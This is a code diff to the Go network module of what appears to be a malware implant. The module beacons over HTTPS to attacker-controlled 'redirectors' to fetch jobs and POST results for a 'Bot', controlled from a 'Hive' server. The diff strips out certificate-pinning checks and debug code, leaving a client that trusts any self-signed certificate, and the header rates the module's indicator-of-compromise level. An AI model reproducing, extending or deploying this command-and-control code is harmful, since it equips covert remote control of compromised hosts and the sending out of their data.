@@ -3,9 +3,9 @@
 //
 //	 Network Method: Egress to a https Golang Server redirector, using a self signed certificate.Implant will not check target TLS fingenprint.
 //
-//   Warnings:       wILL work with MITM tls proxies, but server certificate is not signed.				 
+//   Warnings:       Will work with MITM tls proxies, but server certificate is not signed.				 
 //					 
-//	 Fingenprint:    GO-LANG TLS Libraries (target OS network stack?)
+//	 Fingenprint:    GO-LANG Client TLS Fingerprint
 //
 //   IOC Level:      Medium
 //   
@@ -18,21 +18,18 @@ package network
 import (
 
 	"crypto/tls"
-	//Debug:
-	//"fmt"
-	//"strings"
 	"bytes"
-	//"crypto/sha256"
-	//"encoding/hex"
     "net/http"
     "encoding/json"	
-    //Debug import
-    //"net/http/httputil"
     "io/ioutil"
     "time"
     "net"
 )
 
+/*
+JSON Structures for Compiling Redirectors Network Module parameters
+Hive will have the same definitions in: ./src/hive/hiveImplants.go
+*/
 type BiSelfSignedhttps struct {
 	Port string   `json:"port"`
 	Redirectors []string   `json:"redirectors"`
@@ -40,10 +37,12 @@ type BiSelfSignedhttps struct {
 
 var moduleParams *BiSelfSignedhttps
 
-//Decode Module Parameters, create listener socket and redirectors slice. 
-//Redirectors for https paranoid: Domain:Port
-//This will be saved on memory till process death.
-
+/*
+Description: SelfSignedhttps,Prepare Redirector Slice
+Flow:
+A.JSON Decode redirector data
+B.Loop over each redirector and craft a working https endpoint to connect to
+*/
 func PrepareNetworkMocule(jsonstring string) []string{
 
 	var redirectors []string
@@ -58,18 +57,16 @@ func PrepareNetworkMocule(jsonstring string) []string{
 	return redirectors
 }
 
-//Use Https to retrieve from redirector Jobs for this Bot
+/*
+Description: SelfSignedhttps,Retrieve Jobs
+Flow:
+A.Prepare https client, configure the client to accept self-signed certificates
+B.Get request against target redirector to retrieve jobs
+*/
 func RetrieveJobs(redirector string,authentication string) ([]byte,string){
 
 	var newJobs []byte
 	var error string
-
-	/*
-	result := checkTLSignature(redirector)
-	if result != "Good"{
-		return newJobs,result
-	}
-	*/
 	
 	//HTTP Clients Conf
 	client := &http.Client{
@@ -100,30 +97,19 @@ func RetrieveJobs(redirector string,authentication string) ([]byte,string){
 		return newJobs,error
 	}
 
-	//Debug: Get request
-	/*
-	requestDump, err2 := httputil.DumpResponse(res, true)
-	if err2 != nil {
-  		fmt.Println(err2)
-	}
-	fmt.Println(string(requestDump))
-	*/
-
 	newJobs,_ = ioutil.ReadAll(res.Body)
     return newJobs,"Success"
 }
 
-//Use Https to send a Job to the redirector
+/*
+Description: SelfSignedhttps,Retrieve Jobs
+Flow:
+A.Prepare https client, configure the client to accept self-signed certificates
+B.POST request against target redirector to send a job
+*/
 func SendJobs(redirector string,authentication string,encodedJob []byte) string{
 
 	var error string
-
-	/*Don't Check signature for this module
-	result := checkTLSignature(redirector)
-	if result != "Good"{
-		return result
-	}
-	*/
 
 	//HTTP Clients Conf
 	client := &http.Client{
@@ -155,57 +141,5 @@ func SendJobs(redirector string,authentication string,encodedJob []byte) string{
 		return error
 	}
 
-	//Debug: Post Request
-	/*
-	requestDump, err2 := httputil.DumpRequest(req, true)
-	if err2 != nil {
-  		fmt.Println(err2)
-	}
-	fmt.Println(string(requestDump))
-	*/
-
 	return "Success"
 }
-
-
-/*
-//This two functions check the Hive Certificate signature to make sure it is the Hive we have installed
-func checkTLSignature(redirector string) string{
-
-	var conn net.Conn
-	fprint := strings.Replace(moduleParams.RedFingenPrint, ":", "", -1)
-	bytesFingerprint, err := hex.DecodeString(fprint)
-	if err != nil {
-		return "Redirector TLS Error,fingenprint decoding"+err.Error()
-	}
-	
-	config := &tls.Config{InsecureSkipVerify: true}
-	
-	if conn,err = net.DialTimeout("tcp", redirector,1 * time.Second); err != nil{
-		return "Redirector TLS Error,Red not reachable"+err.Error()
-	}	
-	
-	tls := tls.Client(conn,config)
-	tls.Handshake()
-
-	if ok,err := CheckKeyPin(tls, bytesFingerprint); err != nil || !ok {
-		return "Redirector TLS Error,Red suplantation?"
-	}
-
-	return "Good"
-}
-
-func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool,error) {
-	valid := false
-	connState := conn.ConnectionState() 
-	for _, peerCert := range connState.PeerCertificates { 
-			hash := sha256.Sum256(peerCert.Raw)
-			if bytes.Compare(hash[0:], fingerprint) == 0 {
-
-				valid = true
-			}
-	}
-	return valid, nil
-}
-
-*/
